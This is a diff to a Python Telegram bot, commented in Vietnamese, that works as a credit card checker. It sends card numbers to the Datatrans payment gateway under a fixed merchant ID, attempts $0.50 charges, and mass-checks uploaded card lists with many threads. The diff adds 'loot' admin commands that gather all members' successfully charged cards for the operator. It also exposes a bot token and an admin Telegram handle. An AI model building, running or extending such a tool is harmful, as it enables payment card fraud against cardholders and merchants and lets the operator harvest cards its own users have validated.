@@ -19,17 +19,17 @@ BOT_TOKEN = "8383293948:AAEDVbBV05dXWHNZXod3RRJjmwqc2N4xsjQ"
 ADMIN_ID = 5127429005
 ADMIN_USERNAME = "@startsuttdow"
 
-# Tên file & thư mục lưu trữ
+# --- TÊN FILE & THƯ MỤC LƯU TRỮ ---
 USER_FILE = "authorized_users.txt"
 LIMIT_FILE = "user_limits.json"
 STATS_FILE = "user_stats.json"
 LOG_DIR = "check_logs" # Thư mục chính lưu log
 
-# Giới hạn mặc định cho member
+# --- GIỚI HẠN MẶC ĐỊNH CHO THÀNH VIÊN ---
 DEFAULT_MEMBER_LIMIT = 100
 MEMBER_THREAD_LIMIT = 3
 
-# --- Cấu hình logging ---
+# --- CẤU HÌNH LOGGING ---
 logging.basicConfig(
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
     level=logging.INFO
@@ -116,7 +116,7 @@ def make_request_with_retry(session, method, url, max_retries=10, **kwargs):
 
 def validate_card_format(cc, mes, ano, cvv):
     if not (cc.isdigit() and 10 <= len(cc) <= 19):
-        return False, f"Số thẻ (CC) phải có từ 10-19 chữ số."
+        return False, "Số thẻ (CC) phải có từ 10-19 chữ số."
     if not (mes.isdigit() and 1 <= len(mes) <= 2 and 1 <= int(mes) <= 12):
         return False, "Tháng (MM) phải là số từ 1 đến 12."
     if not (ano.isdigit() and len(ano) in [2, 4]):
@@ -161,7 +161,7 @@ def check_card(line):
         
         # ---- BƯỚC 2: TOKENIZE THẺ ----
         tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
-        tokenize_payload = { "mode": "TOKENIZE", "formId": "250731042226459797", "cardNumber": cc, "cvv": cvv, "paymentMethod": "ECA", "merchantId": "3000022877", "browserUserAgent": ua, "browserJavaEnabled": "false", "browserLanguage": "vi-VN", "browserColorDepth": "24", "browserScreenHeight": "1152", "browserScreenWidth": "2048", "browserTZ": "-420" }
+        tokenize_payload = { "mode": "TOKENIZE", "formId": "250731042226459797", "cardNumber": cc, "cvv": cvv, "paymentMethod": "ECA", "merchantId": "3000022877", "browserUserAgent": ua, "browserJavaEnabled": "false", "browserLanguage": "en-US", "browserColorDepth": "24", "browserScreenHeight": "1152", "browserScreenWidth": "2048", "browserTZ": "-420" }
         tokenize_headers = { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://pay.datatrans.com", "Referer": "https://pay.datatrans.com/upp/payment/SecureFields/paymentField?mode=TOKENIZE&merchantId=3000022877&fieldName=cardNumber&formId=&placeholder=0000%200000%200000%200000&ariaLabel=Card%20number&inputType=tel&version=2.0.0&fieldNames=cardNumber,cvv&instanceId=8di84dqo8", "X-Requested-With": "XMLHttpRequest" }
         
         token_response, error = make_request_with_retry(session, 'post', tokenize_url, data=tokenize_payload, headers=tokenize_headers, timeout=15)
@@ -172,7 +172,7 @@ def check_card(line):
             token_data = token_response.json()
             transaction_id = token_data.get("transactionId")
             if not transaction_id:
-                return 'decline', line, token_data.get("error", {}).get("message", "Không rõ lỗi"), bin_info
+                return 'decline', line, token_data.get("error", {}).get("message", "Unknown error"), bin_info
         except json.JSONDecodeError: return 'error', line, "Phản hồi Tokenize không phải JSON", bin_info
         
         # ---- BƯỚC 3: THANH TOÁN ----
@@ -203,7 +203,7 @@ def create_progress_bar(current, total, length=10):
     bar = '█' * filled_len + '░' * (length - filled_len)
     return f"[{bar}] {int(fraction * 100)}%"
 
-# --- CÁC LỆNH ---
+# --- CÁC LỆNH BOT ---
 async def start(update, context):
     await update.message.reply_text(f"**Chào mừng!**\nID của bạn: `{update.effective_user.id}`\nDùng /help để xem lệnh.")
 
@@ -215,7 +215,6 @@ async def help_command(update, context):
     
     # --- Mẫu tin nhắn trợ giúp ---
     
-    # Lệnh công khai
     public_commands = (
         "**Bảng Lệnh Công Khai** 🛠️\n"
         "Chào mừng bạn! Dưới đây là các lệnh cơ bản bạn có thể sử dụng:\n\n"
@@ -231,7 +230,6 @@ async def help_command(update, context):
         f"*Để sử dụng các tính năng chính, vui lòng liên hệ Admin: {ADMIN_USERNAME}*"
     )
     
-    # Lệnh thành viên
     member_commands = (
         "**Bảng Lệnh Thành Viên** 👤\n"
         "Bạn đã được cấp quyền! Sử dụng các lệnh sau để check thẻ:\n\n"
@@ -242,11 +240,10 @@ async def help_command(update, context):
         "🔹 `/mass<số luồng> <file.txt>`\n"
         "   - *Mô tả:* Kiểm tra hàng loạt thẻ từ một tệp `.txt`.\n"
         "   - *Cách dùng:* Gửi tệp `.txt` và điền caption là `/mass` theo số luồng mong muốn.\n"
-        "   - *Ví dụ:* Gửi file và ghi caption là `/mass20` để chạy 20 luồng.\n"
-        "   - *Mặc định:* `/mass10` (nếu không ghi số luồng).\n"
+        "   - *Ví dụ:* Gửi file và ghi caption là `/mass3` để chạy 3 luồng.\n"
+        "   - *Mặc định:* `/mass` (nếu không ghi số luồng).\n"
     )
 
-    # Lệnh Admin
     admin_commands = (
         "**Bảng Lệnh Quản Trị Viên** 👑\n"
         "Toàn quyền quản lý bot với các lệnh sau:\n\n"
@@ -288,10 +285,10 @@ async def add_user(update, context):
     try:
         user_to_add = int(context.args[0]); users = load_users()
         if user_to_add in users:
-            await update.message.reply_text(f"ℹ️ User `{user_to_add}` đã có trong danh sách.")
+            await update.message.reply_text(f"ℹ️ Người dùng `{user_to_add}` đã có trong danh sách.")
         else:
             users.add(user_to_add); save_users(users)
-            await update.message.reply_text(f"✅ Đã thêm user `{user_to_add}`.")
+            await update.message.reply_text(f"✅ Đã thêm người dùng `{user_to_add}`.")
     except ValueError: await update.message.reply_text("❌ User ID không hợp lệ.")
 
 async def ban_user(update, context):
@@ -301,19 +298,18 @@ async def ban_user(update, context):
         user_to_ban = int(context.args[0]); users = load_users()
         if user_to_ban in users:
             users.discard(user_to_ban); save_users(users)
-            # Xóa thư mục log của user
             user_log_dir = os.path.join(LOG_DIR, str(user_to_ban))
             if os.path.exists(user_log_dir):
                 shutil.rmtree(user_log_dir)
-            await update.message.reply_text(f"🗑 Đã xóa user `{user_to_ban}` và toàn bộ log.")
+            await update.message.reply_text(f"🗑 Đã xóa người dùng `{user_to_ban}` và toàn bộ log.")
         else:
-            await update.message.reply_text(f"ℹ️ Không tìm thấy user `{user_to_ban}`.")
+            await update.message.reply_text(f"ℹ️ Không tìm thấy người dùng `{user_to_ban}`.")
     except ValueError: await update.message.reply_text("❌ User ID không hợp lệ.")
 
 async def show_users(update, context):
     if update.effective_user.id != ADMIN_ID: return
     users = load_users()
-    if not users: await update.message.reply_text("📭 Danh sách user trống."); return
+    if not users: await update.message.reply_text("📭 Danh sách người dùng trống."); return
     message = "👥 **Danh sách ID được phép:**\n\n" + "\n".join(f"- `{uid}`" for uid in users)
     await update.message.reply_text(message)
 
@@ -342,82 +338,80 @@ async def add_limit_command(update, context):
 async def cs_command(update, context):
     user = update.effective_user
     if user.id != ADMIN_ID and user.id not in load_users(): return
-    if not context.args: await update.message.reply_text("Cú pháp: `/cs cc|mm|yy|cvv`"); return
+    if not context.args: await update.message.reply_text("Usage: `/cs cc|mm|yy|cvv`"); return
     
     line = " ".join(context.args)
-    msg = await update.message.reply_text("⏳ *Đang kiểm tra...*")
+    msg = await update.message.reply_text("⏳ *Checking your card, please wait...*")
     try:
         status, original_line, full_response, bin_info = await asyncio.to_thread(check_card, line)
         status_map = {
-            'success': ("✅ CHARGED 0.5$", "Giao dịch thành công!"),
-            'decline': ("❌ DECLINED", "Giao dịch bị từ chối."),
-            'custom': ("🔒 3D SECURE", "Yêu cầu xác thực 3D Secure."),
-            'invalid_format': ("📋 LỖI ĐỊNH DẠNG", full_response),
-            'error': ("❗️ LỖI", full_response),
-            'unknown': ("❔ KHÔNG RÕ", "Không thể xác định trạng thái."),
+            'success': ("✅ CHARGED 0.5$", "Transaction successful!"),
+            'decline': ("❌ DECLINED", "Transaction declined by issuing bank."),
+            'custom': ("🔒 3D SECURE", "3D Secure authentication required."),
+            'invalid_format': ("📋 FORMAT ERROR", full_response),
+            'error': ("❗️ ERROR", full_response),
+            'unknown': ("❔ UNKNOWN", "Could not determine card status from response."),
         }
         status_text, response_message = status_map.get(status, status_map['unknown'])
         bin_str = (f"`{bin_info.get('bank', 'N/A')}`\n"
-                   f"*- Quốc gia:* `{bin_info.get('country_name', 'N/A')}`\n"
-                   f"*- Loại:* `{bin_info.get('type', 'N/A')} - {bin_info.get('brand', 'N/A')}`")
-        final_message = (f"**💠 KẾT QUẢ KIỂM TRA 💠**\n\n"
-                         f"**💳 Thẻ:** `{original_line}`\n"
-                         f"**🚦 Trạng thái: {status_text}**\n"
-                         f"**💬 Phản hồi:** `{response_message}`\n\n"
-                         f"**ℹ️ BIN:** {bin_str}\n\n"
+                   f"*- Country:* `{bin_info.get('country_name', 'N/A')}`\n"
+                   f"*- Type:* `{bin_info.get('type', 'N/A')} - {bin_info.get('brand', 'N/A')}`")
+        final_message = (f"**💠 CARD CHECK RESULT 💠**\n\n"
+                         f"**💳 Card:** `{original_line}`\n"
+                         f"**🚦 Status: {status_text}**\n"
+                         f"**💬 Response:** `{response_message}`\n\n"
+                         f"**🏦 Gateway:** `Charge 0.5$ Auth Api`\n\n"
+                         f"**ℹ️ BIN Info:**\n{bin_str}\n\n"
                          f"👤 *Checker by: @startsuttdow*")
         await msg.edit_text(final_message)
     except Exception as e:
-        logger.error(f"Lỗi /cs: {e}", exc_info=True)
-        await msg.edit_text(f"⛔️ **Lỗi hệ thống:** `{e}`")
+        logger.error(f"Lỗi trong /cs: {e}", exc_info=True)
+        await msg.edit_text(f"⛔️ **System Error:** `{e}`")
 
 async def mass_check_handler(update, context):
     user = update.effective_user
     if user.id != ADMIN_ID and user.id not in load_users(): return
-    if not update.message.document: await update.message.reply_text("Vui lòng gửi kèm file .txt."); return
+    if not update.message.document: await update.message.reply_text("Please attach a .txt file."); return
     document = update.message.document
-    if not document.file_name.lower().endswith('.txt'): await update.message.reply_text("Chỉ chấp nhận file .txt."); return
+    if not document.file_name.lower().endswith('.txt'): await update.message.reply_text("Only .txt files are accepted."); return
     
     file = await context.bot.get_file(document.file_id)
     file_content = (await file.download_as_bytearray()).decode('utf-8')
     lines = [line for line in file_content.splitlines() if line.strip()]
     total_lines = len(lines)
 
-    if not lines: await update.message.reply_text("📂 Tệp trống."); return
+    if not lines: await update.message.reply_text("📂 The file is empty."); return
     
     if user.id != ADMIN_ID:
         user_limit = get_user_limit(user.id)
         if total_lines > user_limit:
-            await update.message.reply_text(f"⛔️ **Vượt giới hạn!**\n"
-                                            f"Tệp của bạn có `{total_lines}` dòng, giới hạn của bạn là `{user_limit}`.")
+            await update.message.reply_text(f"⛔️ **Limit Exceeded!**\n"
+                                            f"Your file has `{total_lines}` lines, but your limit is `{user_limit}`.")
             return
 
     caption = update.message.caption or "/mass"
     
-    # Xác định số luồng yêu cầu
     requested_threads_match = re.match(r'/mass(\d+)', caption)
-    requested_threads = int(requested_threads_match.group(1)) if requested_threads_match else 10 # Mặc định 10 cho admin nếu không ghi
+    requested_threads = int(requested_threads_match.group(1)) if requested_threads_match else 10
 
     num_threads = requested_threads
 
-    # Áp dụng giới hạn luồng cho thành viên
     if user.id != ADMIN_ID:
         if requested_threads > MEMBER_THREAD_LIMIT:
             await update.message.reply_text(
-                f"⚠️ **Giới hạn luồng!**\nThành viên chỉ được sử dụng tối đa {MEMBER_THREAD_LIMIT} luồng. Đã tự động điều chỉnh.",
+                f"⚠️ **Thread Limit!**\nMembers can use a maximum of {MEMBER_THREAD_LIMIT} threads. Adjusting automatically.",
                 quote=True
             )
             num_threads = MEMBER_THREAD_LIMIT
-        # Đảm bảo thành viên chạy ít nhất 1 luồng
         num_threads = max(1, num_threads)
-    else: # Admin không bị giới hạn (tối đa 50)
+    else:
         num_threads = max(1, min(50, requested_threads))
 
     session_timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
     session_dir = os.path.join(LOG_DIR, str(user.id), session_timestamp)
     os.makedirs(session_dir, exist_ok=True)
     
-    status_message = await update.message.reply_text(f"⏳ Khởi tạo... Kiểm tra `{total_lines}` thẻ với `{num_threads}` luồng.")
+    status_message = await update.message.reply_text(f"⏳ Initializing... Checking `{total_lines}` cards with `{num_threads}` threads.")
     
     try:
         counts = {'success': 0, 'decline': 0, 'custom': 0, 'error': 0, 'invalid_format': 0}
@@ -438,7 +432,7 @@ async def mass_check_handler(update, context):
                 
                 line_to_save = f"{original_line} {bin_str}"
                 if status == 'invalid_format':
-                    line_to_save = f"{original_line} | Lý do: {full_response}"
+                    line_to_save = f"{original_line} | Reason: {full_response}"
                 
                 result_lists[status].append(line_to_save)
 
@@ -450,25 +444,23 @@ async def mass_check_handler(update, context):
 
                 if time.time() - last_update_time > 2.0 or processed_count == total_lines:
                     progress_bar = create_progress_bar(processed_count, total_lines, length=20)
-                    status_text = (f"**🚀 Đang kiểm tra...**\n{progress_bar}\n"
-                                   f"`{processed_count}/{total_lines}` | Luồng: `{num_threads}`\n\n"
-                                   f"✅ Charged: `{counts['success']}`\n"
-                                   f"❌ Declined: `{counts['decline']}`\n"
-                                   f"🔒 3D Secure: `{counts['custom']}`\n"
-                                   f"📋 Sai định dạng: `{counts['invalid_format']}`\n"
-                                   f"❔ Lỗi: `{counts['error']}`")
+                    status_text = (f"**🚀 Checking in progress...**\n{progress_bar}\n"
+                                   f"**Progress:** `{processed_count}/{total_lines}` | **Threads:** `{num_threads}`\n\n"
+                                   f"✅ **Charged:** `{counts['success']}`\n"
+                                   f"❌ **Declined:** `{counts['decline']}`\n"
+                                   f"🔒 **3D Secure:** `{counts['custom']}`\n"
+                                   f"📋 **Invalid Format:** `{counts['invalid_format']}`\n"
+                                   f"❔ **Errors:** `{counts['error']}`")
                     try: await status_message.edit_text(text=status_text)
                     except telegram.error.BadRequest: pass
                     last_update_time = time.time()
         
-        # Lưu file tóm tắt
         summary_data = {'counts': counts, 'original_filename': document.file_name}
         save_json_file(os.path.join(session_dir, "summary.json"), summary_data)
         
-        # Cập nhật thống kê chung
         update_user_stats(user.id, user, counts)
 
-        await status_message.edit_text("📊 **Hoàn tất!** Đang gửi kết quả...")
+        await status_message.edit_text("📊 **Complete!** Sending results...")
 
         file_map = {
             'success': 'charged.txt', 'decline': 'declined.txt',
@@ -489,10 +481,10 @@ async def mass_check_handler(update, context):
             await context.bot.send_document(chat_id=ADMIN_ID, document=open(debug_path, 'rb'))
 
     except Exception as e:
-        logger.error(f"Lỗi mass_check: {e}", exc_info=True)
+        logger.error(f"Lỗi trong mass_check: {e}", exc_info=True)
         await status_message.edit_text(f"⛔️ **Lỗi nghiêm trọng!** `{e}`")
 
-# --- LỆNH ADMIN MỚI ---
+# --- CÁC LỆNH ADMIN MỚI ---
 async def show_check_command(update, context):
     if update.effective_user.id != ADMIN_ID: return
     stats = load_json_file(STATS_FILE)
@@ -507,7 +499,7 @@ async def show_check_command(update, context):
                     f"  🔒 Custom: `{data.get('total_custom', 0)}`\n"
                     f"  ❌ Declined: `{data.get('total_decline', 0)}`\n"
                     f"  ❔ Lỗi: `{data.get('total_error', 0) + data.get('total_invalid', 0)}`\n"
-                    f"  🕒 Lần cuối: `{data.get('last_check_timestamp', 'Chưa rõ')}`\n"
+                    f"  🕒 Lần cuối: `{data.get('last_check_timestamp', 'N/A')}`\n"
                     f"--------------------\n")
     
     await update.message.reply_text(message)
@@ -521,35 +513,15 @@ async def loot_file_command(update, context):
     user_log_dir = os.path.join(LOG_DIR, target_user_id)
     
     if not os.path.exists(user_log_dir) or not os.listdir(user_log_dir):
-        await update.message.reply_text(f"Không tìm thấy lịch sử check nào cho user `{target_user_id}`."); return
+        await update.message.reply_text(f"Không tìm thấy lịch sử check nào cho người dùng `{target_user_id}`."); return
         
-    sessions = sorted(os.listdir(user_log_dir), reverse=True)[:25] # Lấy 25 session gần nhất
-    
-    keyboard = []
-    text = f"📜 **Lịch sử check của user `{target_user_id}`:**\n\n"
-    for session_ts in sessions:
-        summary_path = os.path.join(user_log_dir, session_ts, "summary.json")
-        if os.path.exists(summary_path):
-            summary = load_json_file(summary_path)
-            counts = summary.get('counts', {})
-            filename = summary.get('original_filename', 'N/A')
-            
-            # Chuyển đổi timestamp YYYYMMDD-HHMMSS thành dạng dễ đọc
-            try:
-                dt_obj = datetime.strptime(session_ts, "%Y%m%d-%H%M%S")
-                readable_ts = dt_obj.strftime("%d/%m/%Y %H:%M")
-            except ValueError:
-                readable_ts = session_ts
-            
-            button_text = f"🕒 {readable_ts} - ✅{counts.get('success',0)} ❌{counts.get('decline',0)}"
-            callback_data = f"loot_session_{target_user_id}_{session_ts}"
-            keyboard.append([InlineKeyboardButton(button_text, callback_data=callback_data)])
-    
-    if not keyboard:
-        await update.message.reply_text(f"Không có session hợp lệ nào cho user `{target_user_id}`."); return
-        
+    keyboard = [
+        [InlineKeyboardButton("1. Lấy File Charge Gần Nhất", callback_data=f"loot_latestcharge_{target_user_id}")],
+        [InlineKeyboardButton("2. Lấy Tất Cả File Charge", callback_data=f"loot_allcharge_{target_user_id}")],
+        [InlineKeyboardButton("3. Chọn Từ Lịch Sử", callback_data=f"loot_history_{target_user_id}")],
+    ]
     reply_markup = InlineKeyboardMarkup(keyboard)
-    await update.message.reply_text(text, reply_markup=reply_markup)
+    await update.message.reply_text(f"Chọn một tùy chọn để lấy file của user `{target_user_id}`:", reply_markup=reply_markup)
 
 async def button_handler(update, context):
     query = update.callback_query
@@ -557,49 +529,105 @@ async def button_handler(update, context):
     
     data = query.data.split('_')
     command = data[0]
-    
-    if command == "loot" and data[1] == "session":
-        _, _, target_user_id, session_ts = data
-        session_dir = os.path.join(LOG_DIR, target_user_id, session_ts)
-        
-        if not os.path.exists(session_dir):
-            await query.edit_message_text("Lỗi: Không tìm thấy session này."); return
-            
-        files = [f for f in os.listdir(session_dir) if f.endswith('.txt')]
-        if not files:
-            await query.edit_message_text("Session này không có file kết quả nào."); return
-            
-        keyboard = []
-        for filename in files:
-            callback_data = f"loot_getfile_{target_user_id}_{session_ts}_{filename}"
-            keyboard.append([InlineKeyboardButton(f"Tải {filename}", callback_data=callback_data)])
-        
-        # Thêm nút quay lại
-        keyboard.append([InlineKeyboardButton("« Quay lại", callback_data=f"loot_back_{target_user_id}")])
-        
-        reply_markup = InlineKeyboardMarkup(keyboard)
-        await query.edit_message_text(f"Chọn file để tải từ session của user `{target_user_id}` lúc `{session_ts}`:", reply_markup=reply_markup)
+    action = data[1]
+    target_user_id = data[2] if len(data) > 2 else None
 
-    elif command == "loot" and data[1] == "getfile":
-        _, _, target_user_id, session_ts, filename = data
-        file_path = os.path.join(LOG_DIR, target_user_id, session_ts, filename)
+    # Main loot menu
+    if command == "loot" and action == "mainmenu":
+        keyboard = [
+            [InlineKeyboardButton("1. Lấy File Charge Gần Nhất", callback_data=f"loot_latestcharge_{target_user_id}")],
+            [InlineKeyboardButton("2. Lấy Tất Cả File Charge", callback_data=f"loot_allcharge_{target_user_id}")],
+            [InlineKeyboardButton("3. Chọn Từ Lịch Sử", callback_data=f"loot_history_{target_user_id}")],
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        await query.edit_message_text(f"Chọn một tùy chọn để lấy file của user `{target_user_id}`:", reply_markup=reply_markup)
+
+    # 1. Get Latest Charged File
+    elif command == "loot" and action == "latestcharge":
+        user_log_dir = os.path.join(LOG_DIR, target_user_id)
+        if not os.path.exists(user_log_dir) or not os.listdir(user_log_dir):
+            await query.edit_message_text(f"Không có lịch sử check nào cho user `{target_user_id}`."); return
+        
+        latest_session = sorted(os.listdir(user_log_dir), reverse=True)[0]
+        file_path = os.path.join(user_log_dir, latest_session, "charged.txt")
         
         if os.path.exists(file_path):
             await context.bot.send_document(chat_id=query.from_user.id, document=open(file_path, 'rb'))
-            await query.edit_message_text(f"✅ Đã gửi file `{filename}`.")
+            await query.edit_message_text(f"✅ Đã gửi file charge gần nhất từ session `{latest_session}`.")
         else:
-            await query.edit_message_text("❌ Lỗi: File không tồn tại.")
+            await query.edit_message_text(f"ℹ️ Lần check gần nhất (`{latest_session}`) không có thẻ charge nào.")
+
+    # 2. Get All Charged Files
+    elif command == "loot" and action == "allcharge":
+        user_log_dir = os.path.join(LOG_DIR, target_user_id)
+        if not os.path.exists(user_log_dir) or not os.listdir(user_log_dir):
+            await query.edit_message_text(f"Không có lịch sử check nào cho user `{target_user_id}`."); return
             
-    elif command == "loot" and data[1] == "back":
-        # Tái tạo lại danh sách session cho user
-        await loot_file_command(query, context)
-        await query.message.delete() # Xóa tin nhắn cũ có các nút file
+        all_charged_content = []
+        sessions = sorted(os.listdir(user_log_dir))
+        for session_ts in sessions:
+            file_path = os.path.join(user_log_dir, session_ts, "charged.txt")
+            if os.path.exists(file_path):
+                with open(file_path, 'r', encoding='utf-8') as f:
+                    all_charged_content.append(f.read())
+        
+        if all_charged_content:
+            combined_content = "\n".join(all_charged_content)
+            file_to_send = io.BytesIO(combined_content.encode('utf-8'))
+            filename = f"all_charged_{target_user_id}.txt"
+            await context.bot.send_document(chat_id=query.from_user.id, document=file_to_send, filename=filename)
+            await query.edit_message_text(f"✅ Đã gửi file tổng hợp tất cả thẻ charge của user `{target_user_id}`.")
+        else:
+            await query.edit_message_text(f"ℹ️ User `{target_user_id}` không có thẻ charge nào trong lịch sử.")
+
+    # 3. Choose from History
+    elif command == "loot" and action == "history":
+        user_log_dir = os.path.join(LOG_DIR, target_user_id)
+        sessions = sorted(os.listdir(user_log_dir), reverse=True)[:25]
+        keyboard = []
+        for session_ts in sessions:
+            summary_path = os.path.join(user_log_dir, session_ts, "summary.json")
+            if os.path.exists(summary_path):
+                summary = load_json_file(summary_path)
+                counts = summary.get('counts', {})
+                try: dt_obj = datetime.strptime(session_ts, "%Y%m%d-%H%M%S"); readable_ts = dt_obj.strftime("%d/%m/%Y %H:%M")
+                except ValueError: readable_ts = session_ts
+                button_text = f"🕒 {readable_ts} - ✅{counts.get('success',0)} ❌{counts.get('decline',0)}"
+                keyboard.append([InlineKeyboardButton(button_text, callback_data=f"loot_session_{target_user_id}_{session_ts}")])
+        
+        keyboard.append([InlineKeyboardButton("« Quay lại Menu Chính", callback_data=f"loot_mainmenu_{target_user_id}")])
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        await query.edit_message_text(f"📜 **Lịch sử check của user `{target_user_id}`:**", reply_markup=reply_markup)
+
+    # Drill down into a session
+    elif command == "loot" and action == "session":
+        _, _, target_user_id, session_ts = data
+        session_dir = os.path.join(LOG_DIR, target_user_id, session_ts)
+        files = [f for f in os.listdir(session_dir) if f.endswith('.txt')] if os.path.exists(session_dir) else []
+        if not files:
+            await query.edit_message_text("Session này không có file kết quả nào."); return
+        keyboard = []
+        for filename in files:
+            keyboard.append([InlineKeyboardButton(f"Tải {filename}", callback_data=f"loot_getfile_{target_user_id}_{session_ts}_{filename}")])
+        keyboard.append([InlineKeyboardButton("« Quay lại Lịch Sử", callback_data=f"loot_history_{target_user_id}")])
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        await query.edit_message_text(f"Chọn file để tải từ session `{session_ts}`:", reply_markup=reply_markup)
+
+    # Get a specific file
+    elif command == "loot" and action == "getfile":
+        _, _, target_user_id, session_ts, filename = data
+        file_path = os.path.join(LOG_DIR, target_user_id, session_ts, filename)
+        if os.path.exists(file_path):
+            await context.bot.send_document(chat_id=query.from_user.id, document=open(file_path, 'rb'))
+            await query.answer(f"Đã gửi file {filename}")
+        else:
+            await query.answer("❌ Lỗi: Không tìm thấy file.", show_alert=True)
 
 def main():
     defaults = Defaults(parse_mode=ParseMode.MARKDOWN, disable_web_page_preview=True)
     application = Application.builder().token(BOT_TOKEN).defaults(defaults).build()
 
-    # Lệnh cơ bản và quản lý
+    # Lệnh cơ bản & Quản lý
     application.add_handler(CommandHandler("start", start))
     application.add_handler(CommandHandler("info", info))
     application.add_handler(CommandHandler("help", help_command))
@@ -612,11 +640,11 @@ def main():
     application.add_handler(CommandHandler("showcheck", show_check_command))
     application.add_handler(CommandHandler("lootfile", loot_file_command))
     
-    # Lệnh check thẻ
+    # Lệnh Check Thẻ
     application.add_handler(CommandHandler("cs", cs_command))
     application.add_handler(MessageHandler(filters.Document.TEXT & filters.CaptionRegex(r'^/mass(\d*)'), mass_check_handler))
     
-    # Handler cho nút bấm inline
+    # Handler cho Nút Bấm Inline
     application.add_handler(CallbackQueryHandler(button_handler))
     
     logger.info(f"Bot đang chạy với Admin ID: {ADMIN_ID}")
